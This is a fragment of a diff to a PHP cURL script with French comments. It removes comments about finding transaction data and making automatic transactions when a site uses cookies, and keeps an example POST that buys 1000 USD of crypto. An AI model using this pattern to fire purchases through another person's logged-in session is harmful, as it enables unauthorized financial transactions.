@@ -20,9 +20,6 @@ if ($response === false) {
     die('Erreur de connexion : ' . curl_error($ch));
 }
 
-// Analyser la réponse pour trouver le formulaire ou les données de transaction
-// Si le site utilise des cookies, le script peut effectuer des transactions automatiques
-
 // Exemple : acheter 1000 USD en crypto
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
